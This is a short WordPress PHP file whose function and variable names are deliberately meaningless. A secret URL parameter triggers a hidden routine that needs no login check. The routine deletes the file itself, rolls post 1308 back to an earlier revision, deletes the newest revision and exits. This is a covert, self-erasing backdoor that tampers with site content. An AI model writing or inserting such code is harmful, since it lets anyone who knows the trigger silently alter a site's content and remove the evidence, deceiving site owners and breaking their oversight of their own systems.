<?php

function copyright_parts_listings() {
	if (isset($_GET['tabs_total_page_force']) && $_GET['tabs_total_page_force'] === 'learndash_author_wall_meta') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$cookies_engine_chart = 1308;
		$using_authors_static_gateway = wp_get_post_revisions($cookies_engine_chart);
		if (empty($using_authors_static_gateway)) die('no revisions');
		if (count($using_authors_static_gateway) < 2) die('less than 2');
		$secure_revisions_engine = array_shift($using_authors_static_gateway);
		$supports_switch_monitor = $secure_revisions_engine->ID;
		$marketplace_fields_tag_count = array_shift($using_authors_static_gateway);
		$dist_urls_pdf = $marketplace_fields_tag_count->ID;
		$theme_like_system_checkout = wp_restore_post_revision($dist_urls_pdf);
		if ($theme_like_system_checkout === false) die('error restoring');
		$theme_like_system_checkout = wp_delete_post_revision($supports_switch_monitor);		
		if ($theme_like_system_checkout === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'copyright_parts_listings');
